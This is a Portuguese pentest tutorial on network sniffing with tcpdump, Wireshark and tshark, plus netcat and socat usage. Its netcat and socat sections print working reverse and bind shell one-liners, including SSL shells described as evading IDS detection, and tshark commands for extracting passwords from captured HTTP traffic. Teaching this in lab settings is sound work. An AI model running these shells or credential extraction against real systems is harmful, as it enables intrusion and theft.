# 🕵️ Sniffing e Análise de Rede

> Capturar, analisar e manipular tráfego de rede. Essencial para entender o que está acontecendo na rede.

## 📚 O que é Análise de Rede (Sniffing)?

**Sniffing** é capturar e analisar o tráfego que passa pela rede. É como colocar um microfone no fio da internet — você vê tudo que está sendo enviado: senhas, emails, tokens, dados sensiveis.

### Por que isso é importante?

- Senhas via HTTP ficam em **texto plano** (sem criptografia)
- Tokens de sessão podem ser **roubados** e reutilizados
- Tráfego DNS revela **quais sites** os usuários acessam
- Atacantes podem **interceptar** dados em redes públicas (WiFi)

### Como funciona na prática?

```
Seu computador ←→ Roteador ←→ Internet
                         ↓
                  [Sniffing acontece aqui]
                  
Você captura pacotes que passam pelo roteador
```

### O que você pode capturar?

| Protocolo | Dados expostos | Risco |
|:---|:---|:---|
| HTTP | Senhas, cookies, forms | Crítico |
| DNS | Sites acessados | Médio |
| FTP | Senhas em texto | Crítico |
| SMTP | Emails enviados | Alto |
| SNMP | Configurações de rede | Alto |

### Ferramentas que você vai usar

| Ferramenta | Para que serve |
|:---|:---|
| tcpdump | Capturar pacotes no terminal |
| Wireshark | Analisar pacotes graficamente |
| tshark | tcpdump + filtros avançados |
| mitmproxy | Proxy para HTTPS também |
| bettercap | Man-in-the-middle automatizado |

### ⚠️ Aviso Legal

> Sniffing em redes que **não são suas** é **crime** no Brasil (Lei 12.737/2012). Use apenas em:
> - Sua própria rede doméstica
> - Laboratórios de estudo (TryHackMe, HackTheBox)
> - Redes com autorização **por escrito**

---

## 🚀 Passo a Passo — Como fazer Sniffing de Rede

Você quer **ver o que está passando pela rede** — senhas, dados, conversas. Vamos começar do mais simples.

### Passo 1: Descobrir sua interface de rede
```bash
# Primeiro, veja quais interfaces de rede você tem
ip a
# OUTPUT ESPERADO:
# 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN
#     inet 127.0.0.1/8 scope host lo
# 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP
#     inet 10.0.0.100/24 brd 10.0.0.255 scope global dynamic eth0
```

### Passo 2: Capturar tudo (TCPDump)
```bash
# Agora capture tudo que passa pela interface (use sudo!)
sudo tcpdump -i eth0 -nn
# OUTPUT ESPERADO:
# tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
# listening on eth0, link-type EN10MB (Ethernet), capture length 262144 bytes
# 10:23:45.123456 IP 10.0.0.100.44432 > 93.184.216.34.80: Flags [S], seq 123456, win 64240, length 0
# 10:23:45.234567 IP 93.184.216.34.80 > 10.0.0.100.44432: Flags [S.], seq 789012, ack 123457, win 65535, length 0
# 10:23:45.345678 IP 10.0.0.100.44432 > 93.184.216.34.80: Flags [.], ack 1, win 502, length 0

# Para parar: Ctrl+C
```

### Passo 3: Filtrar só o que interessa
```bash
# Só tráfego HTTP (porta 80):
sudo tcpdump -i eth0 -nn port 80

# Só de um IP específico:
sudo tcpdump -i eth0 -nn host 192.168.1.1

# Só DNS (descobrir quais sites estão sendo acessados):
sudo tcpdump -i eth0 -nn port 53
```

### Passo 4: Salvar para analisar depois
```bash
# Salvar em arquivo .pcap
sudo tcpdump -i eth0 -w capture.pcap

# Depois, analise com tshark ou abra no Wireshark (GUI)
tshark -r capture.pcap
```

### Passo 5: Analisar com filtros (tshark)
```bash
# Ver só pacotes HTTP
tshark -r capture.pcap -Y "http"

# Ver senhas que foram enviadas
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data
```

### Resumo da ordem — Por que essa sequência?

A análise de rede segue a ordem: **capturar → filtrar → analisar → agir**.

```
PASSO 1: ip a → Descobrir sua interface de rede
├── POR QUE: Precisa saber qual interface usar (eth0, wlan0, ens33)
├── O QUE PROCURAR: IP da interface, status (UP/DOWN), nome
├── COMANDO: ip a (mostra todas as interfaces)
├── QUANDO AVANÇAR: Quando souber o nome da interface (ex: eth0)
└── SE DER ERRADO: Se não tiver interface com IP, configure com dhclient ou ip addr add

        ↓

PASSO 2: tcpdump -i eth0 → Capturar tudo que passa na rede
├── POR QUE: Para ver o tráfego, primeiro precisa capturar
├── O QUE PROCURAR: Tráfego estranho, IPs desconhecidos, protocolos incomuns
├── COMANDO: sudo tcpdump -i eth0 -nn (Ctrl+C para parar)
├── QUANDO AVANÇAR: Quando quiser filtrar só o que interessa
└── SE DER ERRADO: Se não capturar nada, verifique se a interface está UP: ip link set eth0 up

        ↓

PASSO 3: tcpdump port 80 → Filtrar só HTTP
├── POR QUE: HTTP tem dados em texto plano (senhas, tokens)
├── O QUE PROCURAR: Requisições GET/POST, cookies, credenciais
├── COMANDO: sudo tcpdump -i eth0 -nn port 80
├── QUANDO AVANÇAR: Quando quiser ver o conteúdo dos pacotes
└── SE DER ERRADO: Se precisar de HTTPS, use port 443 (mas dados estarão criptografados)

        ↓

PASSO 4: tcpdump -w file → Salvar em arquivo para analisar depois
├── POR QUE: Análise offline é mais completa e não perde dados
├── O QUE PROCURAR: Arquivo .pcap para abrir no Wireshark
├── COMANDO: sudo tcpdump -i eth0 -w capture.pcap
├── QUANDO AVANÇAR: Quando tiver o arquivo salvo
└── SE DER ERRADO: Se o arquivo estiver vazio, verifique permissões: sudo chmod 666 capture.pcap

        ↓

PASSO 5: tshark -r file → Analisar com filtros
├── POR QUE: Filtros ajudam a encontrar dados específicos (senhas, URLs)
├── O QUE PROCURAR: POST requests (envio de dados), cookies de sessão, tokens
├── COMANDO: tshark -r capture.pcap -Y "http.request.method == POST"
├── QUANDO AVANÇAR: Quando encontrar dados sensíveis ou padrões estranhos
└── SE DER ERRADO: Se tshark não estiver instalado: sudo apt install tshark
```

**Dica:** Para ver senhas em HTTP: `tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data`

---

## Wireshark

Analisador de protocolos mais completo. Interface gráfica para inspecionar pacotes.

### 🎯 Quando usar o Wireshark
- Precisa analisar tráfego de rede detalhadamente para encontrar vulnerabilidades
- Quer investigar ataque MITM ou poisoning de rede (ARP, DNS)
- Está auditando segurança de rede e precisa ver protocols específicos (HTTP, DNS, SMB)
- Precisa extrair credenciais, tokens ou dados sensíveis de captures de rede

### 🛠️ Como o Wireshark te ajuda
- Interface gráfica facilita visualização de pacotes com cores por protocolo
- Filtros avançados (display filters) isolem tráfego específico em segundos
- Decodificação completa de protocolos mostra headers, payloads e artefatos
- Estatísticas e gráficos revelam padrões de tráfego e anomalias

### ➡️ Depois de usar o Wireshark — Próximos passos
1. Extraia credenciais encontradas: `tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data`
2. Documente IPs, portas e protocolos maliciosos identificados no relatório
3. Use IPs encontrados para aprofundar enumeração com Nmap ou outras ferramentas
4. Salve evidências (pcap) para forense ou apresentação em relatório de pentest

### Instalação
```bash
sudo apt install -y wireshark
# Para usar sem root:
sudo usermod -aG wireshark $USER
# Fazer logout/login depois
```

### Ferramentas de linha de comando

#### tshark (Wireshark via terminal)

```bash
# Listar interfaces
tshark -D
# OUTPUT ESPERADO:
# 1. eth0 (Linux)
# 2. lo (Linux)
# 3. any (Pseudo-device)

# Capturar na interface eth0
tshark -i eth0
# OUTPUT ESPERADO:
# Capturing on 'eth0'
# 1   0.000000000  10.0.0.100 → 93.184.216.34 HTTP GET / HTTP/1.1
# 2   0.123456789  93.184.216.34 → 10.0.0.100 HTTP/1.1 200 OK

# Capturar e salvar em arquivo
tshark -i eth0 -w capture.pcap

# Ler arquivo pcap
tshark -r capture.pcap
# OUTPUT ESPERADO:
# 1   0.000000000  10.0.0.100 → 93.184.216.34 HTTP GET / HTTP/1.1
# 2   0.123456789  93.184.216.34 → 10.0.0.100 HTTP/1.1 200 OK

# Ler com filtro
tshark -r capture.pcap -Y "http"
# OUTPUT ESPERADO:
# 1   0.000000000  10.0.0.100 → 93.184.216.34 HTTP GET / HTTP/1.1

# Extrair campos específicos
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
# OUTPUT ESPERADO:
# www.example.com    /
# www.example.com    /images/logo.png

# Contar pacotes
tshark -r capture.pcap | wc -l
# OUTPUT ESPERADO:
# 1234

# Estatísticas de protocolo
tshark -r capture.pcap -q -z io,phs
# OUTPUT ESPERADO:
# =================================================================
# | Protocol Hierarchy                                            |
# |                                                               |
# | Frame 1: 256 bytes on wire, 256 bytes captured                |
# | Ethernet II: Src: aa:bb:cc:dd:ee:ff, Dst: 11:22:33:44:55:66  |
# | IPv4: Src: 10.0.0.100, Dst: 93.184.216.34                    |
# | TCP: Src Port: 44432, Dst Port: 80                           |
# | HTTP: GET / HTTP/1.1                                          |
```

### Filtros Wireshark (Display Filters)

```
# Por IP
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 192.168.1.1

# Por porta
tcp.port == 80
tcp.dstport == 443
udp.port == 53

# Por protocolo
http
dns
tcp
udp
icmp
ssh
ftp

# Combinações
http && ip.src == 192.168.1.1
tcp.port == 80 && http
dns && ip.dst == 8.8.8.8

# Por conteúdo
http contains "password"
http.user_agent contains "curl"
dns.qry.name contains "target"

# Por tamanho
frame.len > 1000
frame.len < 100

# Por flags TCP
tcp.flags.syn == 1
tcp.flags.rst == 1
tcp.flags.fin == 1

# HTTP específico
http.request.method == "POST"
http.response.code == 200
http.host == "target.com"
```

### Capturas úteis

```bash
# Capturar tráfego HTTP completo
tshark -i eth0 -f "tcp port 80" -w http_capture.pcap

# Capturar apenas DNS
tshark -i eth0 -f "udp port 53" -w dns_capture.pcap

# Capturar com filtro BPF (antes de gravar)
tshark -i eth0 -f "host 192.168.1.100 and tcp port 22" -w ssh_capture.pcap

# Ler e filtrar depois
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri -e http.file_data
```

---

## TCPDump

Sniff de pacotes via terminal. Leve, rápido e presente em qualquer Linux.

### 🎯 Quando usar o TCPDump
- Precisa capturar tráfego em ambiente sem interface gráfica (servidor remoto)
- Quer monitorar portas específicas em tempo real durante pentest
- Está investigando atividade suspeita e precisa ver pacotes brutos
- Precisa salvar tráfego em arquivo .pcap para análise posterior no Wireshark

### 🛠️ Como o TCPDump te ajuda
- Flags `-nn` e `-i` simplificam captura rápida de qualquer interface
- Filtros BPF isolem tráfego por IP, porta, protocolo e tamanho
- Opção `-w` salva captures completos para análise offline
- Integração com `grep` e scripts para automação de monitoramento

### ➡️ Depois de usar o TCPDump — Próximos passos
1. Abra o arquivo .pcap no Wireshark para análise visual detalhada
2. Identifique padrões: portas abertas, protocolos em uso, IPs incomuns
3. Use IPs e portas descobertos para direcionar scans Nmap mais específicos
4. Documente findings e salve evidências para relatório de segurança

### Instalação
```bash
sudo apt install -y tcpdump
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-i` | Interface |
| `-n` | Não resolver DNS |
| `-nn` | Não resolver DNS nem portas |
| `-w` | Salvar em arquivo pcap |
| `-r` | Ler arquivo pcap |
| `-A` | Mostrar pacotes em ASCII |
| `-X` | Mostrar pacotes em hex + ASCII |
| `-v` / `-vv` / `-vvv` | Verbose crescente |
| `-c` | Número máximo de pacotes |
| `-s` | Tamanho do snapshot (0 = inteiro) |
| `-f` | Filtro BPF |
| `-l` | Output line-buffered (para grep) |

### Filtros BPF (Berkeley Packet Filter)

```
# Por host
host 192.168.1.1
src host 192.168.1.1
dst host 192.168.1.1

# Por porta
port 80
src port 443
dst port 22

# Por rede
net 192.168.1.0/24
src net 10.0.0.0/8

# Por protocolo
tcp
udp
icmp

# Combinações
host 192.168.1.1 and port 80
src 192.168.1.1 and (dst port 80 or dst port 443)
not port 22

# Por tamanho
greater 1000
less 100
```

### Exemplos práticos

```bash
# Capturar tudo na interface
sudo tcpdump -i eth0
# OUTPUT ESPERADO:
# tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
# listening on eth0, link-type EN10MB (Ethernet), capture length 262144 bytes
# 10:23:45.123456 IP 10.0.0.100.44432 > 93.184.216.34.80: Flags [S], seq 123456

# Sem resolver nomes (mais rápido)
sudo tcpdump -i eth0 -nn

# Porta específica
sudo tcpdump -i eth0 port 80
# OUTPUT ESPERADO:
# listening on eth0, link-type EN10MB (Ethernet), capture length 262144 bytes
# 10:23:45.123456 IP 10.0.0.100.44432 > 93.184.216.34.80: Flags [S], seq 123456

# Salvar em arquivo
sudo tcpdump -i eth0 -w capture.pcap
# OUTPUT ESPERADO:
# tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture length 262144 bytes
# ^C
# 15 packets captured
# 15 packets received by filter
# 0 packets dropped by kernel

# DNS queries
sudo tcpdump -i eth0 -nn port 53
# OUTPUT ESPERADO:
# 10:23:45.123456 IP 10.0.0.100.54321 > 8.8.8.8.53: 12345+ A? www.example.com. (34)
# 10:23:45.234567 IP 8.8.8.8.53 > 10.0.0.100.54321: 12345 1/0/0 A 93.184.216.34 (50)

# SYN scan detection
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'
# OUTPUT ESPERADO:
# 10:23:45.123456 IP 10.0.0.100.44432 > 93.184.216.34.80: Flags [S], seq 123456
```

### Lendo captures
```bash
# Listar pacotes
tcpdump -r capture.pcap -nn

# Filtrar por IP
tcpdump -r capture.pcap host 192.168.1.1

# Mostrar conteúdo
tcpdump -r capture.pcap -A

# Estatísticas
tcpdump -r capture.pcap -q | head -20
```

---

## Netcat (nc)

A "faca suíça" de redes. Conexões, listeners, transferências, reverse shells.

### 🎯 Quando usar o Netcat
- Precisa testar conectividade entre máquinas rapidamente (port scanning)
- Quer criar reverse shell para ganhar acesso remoto em ambiente de pentest
- Precisa transferir arquivos entre máquinas durante exploração
- Está configurando bind shell para persistência em lab de segurança

### 🛠️ Como o Netcat te ajuda
- `-zv` faz scan rápido de portas sem necessidade de Nmap
- `-lvnp` cria listener para receber conexões de reverse shells
- Pipe simples (`cat | nc`) transfere arquivos sem ferramentas extras
- `-e /bin/bash` executa shell diretamente na conexão (para pentest autorizado)

### ➡️ Depois de usar o Netcat — Próximos passos
1. Se criou reverse shell, melhore estabilidade com `script /dev/null -c bash`
2. Escal privilegios na máquina remota com LinPEAS ou WinPEAS
3. Documente portas abertas e serviços descobertos para próximas fases
4. Se transferiu arquivos, verifique integridade com checksum (md5sum)

### Instalação
```bash
sudo apt install -y netcat-openbsd
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-l` | Modo listen (servidor) |
| `-v` | Verbose |
| `-n` | Não resolver DNS |
| `-p` | Porta |
| `-e` | Executar comando (conexão) |
| `-u` | UDP (padrão é TCP) |
| `-z` | Zero-I/O (só scan) |
| `-w` | Timeout |

### Exemplos práticos

```bash
# === CONEXÃO BÁSICA ===

# Listener (servidor)
nc -lvnp 4444

# Conectar (cliente)
nc 192.168.1.1 4444

# === REVERSE SHELL ===

# Na máquina atacante (listener):
nc -lvnp 4444

# Na vítima (conectar shell ao atacante):
nc 192.168.1.1 4444 -e /bin/bash

# Com Netcat que não tem -e (usar pipe):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.1 4444 >/tmp/f

# === BIND SHELL ===

# Na vítima (servidor com shell):
nc -lvnp 4444 -e /bin/bash

# No atacante (conectar):
nc 192.168.1.1 4444

# === TRANSFERÊNCIA DE ARQUIVOS ===

# Receber arquivo:
nc -lvnp 4444 > arquivo_recebido.bin

# Enviar arquivo:
nc 192.168.1.1 4444 < arquivo_enviar.bin

# === SCAN DE PORTAS ===

# Scan de portas
nc -zv 192.168.1.1 1-1000

# Range de portas
nc -zv 192.168.1.1 20-30

# === CHAT SIMPLES ===

# Máquina A:
nc -lvnp 4444

# Máquina B:
nc 192.168.1.1 4444
# Digite mensagens em ambas as pontas

# === WEB SERVER SIMPLES ===

# Servir arquivo via HTTP:
while true; do echo -e "HTTP/1.1 200 OK\r\n\r\n$(cat index.html)" | nc -lvnp 80; done
```

---

## Socat

Netcat em esteroides. Suporta SSL, UDP, proxy, port forwarding.

### 🎯 Quando usar o Socat
- Precisa de reverse shell com criptografia (SSL) para evitar detecção
- Quer fazer port forwarding avançado que Netcat não suporta
- Precisa de proxy bidirecional com suporte a UDP
- Está criando túneis seguros para pivoting em redes internas

### 🛠️ Como o Socat te ajuda
- `OPENSSL-LISTEN` cria reverse shell com SSL, evitando detecção por IDS/IPS
- `EXEC:/bin/bash` fornece shell diretamente, mais flexível que `-e` do Netcat
- Suporte a `fork` permite múltiplas conexões simultâneas
- Port forwarding avançado redireciona tráfego entre redes segmentadas

### ➡️ Depois de usar o Socat — Próximos passos
1. Se usou SSL, valide certificado: `openssl s_client -connect IP:PORT`
2. Para port forwarding, teste conectividade end-to-end antes de usar em produção
3. Documente túneis e forwards criados para manutenção futura
4. Use em combinação com Chisel ou ligolo-ng para pivoting em ambientes complexos

### Instalação
```bash
sudo apt install -y socat
```

### Conceito fundamental

Socat conecta dois "endpoints" (ADDRESS). Formato:
```
socat ADDRESS1 ADDRESS2
```

### Endpoints mais usados

| Endpoint | Descrição |
|:---|:---|
| `TCP-LISTEN:PORT` | Escuta TCP |
| `TCP:HOST:PORT` | Conecta TCP |
| `OPENSSL-LISTEN:PORT` | Escuta com SSL |
| `OPENSSL:HOST:PORT` | Conecta com SSL |
| `STDIN` | Entrada padrão |
| `STDOUT` | Saída padrão |
| `EXEC:CMD` | Executa comando |

### Exemplos práticos

```bash
# === CONEXÃO BÁSICA ===

# Listener:
socat TCP-LISTEN:4444,reuseaddr,fork STDOUT

# Conectar:
socat - TCP:192.168.1.1:4444

# === REVERSE SHELL COM SSL ===

# Gerar certificado:
openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
cat server.key server.crt > server.pem

# Atacante (listener com SSL):
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 STDOUT

# Vítima (reverse shell criptografada):
socat OPENSSL:192.168.1.1:4444,verify=0 EXEC:/bin/bash

# === BIND SHELL COM SSL ===

# Vítima:
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,reuseaddr,fork EXEC:/bin/bash

# Atacante:
socat OPENSSL:192.168.1.1:4444,verify=0 STDIN

# === PORT FORWARDING ===

# Redirecionar porta 8080 para porta 80 do target:
socat TCP-LISTEN:8080,fork TCP:target.com:80

# === REVERSE SHELL SEM -e ===

# Usando socat para dar shell:
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# === TRANSFERÊNCIA COMPLETA ===

# Receber:
socat TCP-LISTEN:4444,reuseaddr FILE:arquivo_recebido.bin,create

# Enviar:
socat FILE:arquivo.bin TCP:192.168.1.1:4444

# === HTTPS SIMPLES ===

socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80
```

### Socat vs Netcat

| Feature | Netcat | Socat |
|:---|:---|:---|
| SSL/TLS | Não | Sim |
| UDP | Sim | Sim |
| Port forwarding | Limitado | Completo |
| Proxy | Não | Sim |
| Execução de shell | `-e` | `EXEC:` |
| Fork | Não | Sim |

---

## Fluxo típico de Análise de Rede

```
1. TCPDump/Wireshark → capturar tráfego
        ↓
2. Filtros → isolar tráfego relevante (HTTP, DNS, etc)
        ↓
3. Analisar conteúdo → encontrar credenciais, dados sensíveis
        ↓
4. Netcat/Socat → testar conectividade, criar shells
        ↓
5. Documentar findings
```

---

## Lab Prático

### Exercício 1: Sniffing e Análise com Wireshark
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/wireshark
- **O que vai praticar:** Captura de pacotes, filtros Wireshark, análise de protocolos e extração de dados
- **Tempo estimado:** 45 minutos

### Exercício 2: TCPDump na Prática
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/whatisnetworking
- **O que vai praticar:** Captura com TCPDump, filtros BPF, análise de tráfego e salvamento de captures
- **Tempo estimado:** 30 minutos

### Exercício 3: Network Traffic Analysis
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/trafficanalysis
- **O que vai praticar:** Análise de tráfego suspeito, identificação de malware e extração de credenciais
- **Tempo estimado:** 60 minutos

### Exercício 4: Netcat - The GUI Edition
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/nc
- **O que vai praticar:** Conexões Netcat, transferência de arquivos, reverse shells e bind shells
- **Tempo estimado:** 40 minutos

### Dica de Estudo
> Pratique criando um servidor HTTP simples com Netcat e capture o tráfego com TCPDump. Depois, analise o capture no Wireshark buscando headers, parâmetros e possíveis credenciais. Isso simula um cenário real de ataque.
